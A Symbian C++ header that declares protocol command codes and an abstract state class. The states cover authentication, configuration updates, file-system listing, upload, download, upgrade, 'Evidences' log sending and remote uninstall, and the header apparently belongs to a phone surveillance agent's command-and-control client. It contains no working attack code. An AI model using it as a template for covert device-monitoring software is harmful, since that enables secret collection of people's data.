/*
 ============================================================================
 Name		: AbstractState.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAbstractState declaration
 ============================================================================
 */
#ifndef ABSTRACTSTATE_H
#define ABSTRACTSTATE_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>
// CLASS DECLARATION
_LIT8(KInvalid_Command, "\x00\x00\x00\x00");
_LIT8(KProto_Ok, "\x01\x00\x00\x00");
_LIT8(KProto_No, "\x02\x00\x00\x00");
_LIT8(KProto_Bye, "\x03\x00\x00\x00");
_LIT8(KProto_NewConf, "\x07\x00\x00\x00");
_LIT8(KProto_Log, "\x09\x00\x00\x00");
_LIT8(KProto_CmdUninstall, "\x0A\x00\x00\x00");
_LIT8(KProto_Download, "\x0C\x00\x00\x00");
_LIT8(KProto_Upload, "\x0D\x00\x00\x00");
_LIT8(KProto_Id, "\x0F\x00\x00\x00");
_LIT8(KProto_Upgrade, "\x16\x00\x00\x00");
_LIT8(KProto_FileSystem, "\x19\x00\x00\x00");

_LIT8(KSymbian_SubType, "SYMBIAN");

//errors arised when parsing responses
#define KErrAuth		0x01	//KErrAuth is used in authorization response, where a bye is not needed
#define KErrContent		0x02  	//not the right content type
#define KErrSha			0x03	//error on SHA
#define KErrNotOk		0x04	//response was not OK

enum TState
	{
	EState_None = 0x0,
	EState_Authentication,
	EState_Identification = 0xf,
	EState_NewConf = 0x7,
	EState_FileSystem = 0x19,
	EState_Download = 0xc,
	EState_Upload = 0xd,
	EState_Upgrade = 0x16,
	EState_Evidences = 0x9,
	EState_Cmd_Uninstall = 0xa,
	EState_Bye = 0x3
	};

// Forward declaration
class CAbstractState;

class MStateObserver
	{
public:
	virtual void ChangeStateL()=0;
	virtual void SendStateDataL(const TDesC8& data)=0;
	virtual void NewConfigAvailable()=0;
	virtual HBufC8* GetRequestHeaderL()=0;
	virtual void SetCookie(const TDesC8& aCookie)=0;
	virtual void SetKey(const TDesC8& aKey)=0;
	virtual void SetAvailables(TInt aNumAvailables,const TDesC8& aAvailables)=0;
	virtual void ReConnect()=0;
	virtual void ResponseError(TInt aError)=0;
	};

/**
 *  CAbstractState
 * 
 */
class CAbstractState : public CBase
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAbstractState();

public:
	virtual void ActivateL(const TDesC8& aData)=0; 
	virtual void ProcessDataL(const TDesC8& aData) = 0;
	TState Type();

protected:
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAbstractState(TState aStateId, MStateObserver& aObserver);
	
protected:
	MStateObserver& iObserver;
	TState iState;
	};

#endif // ABSTRACTSTATE_H
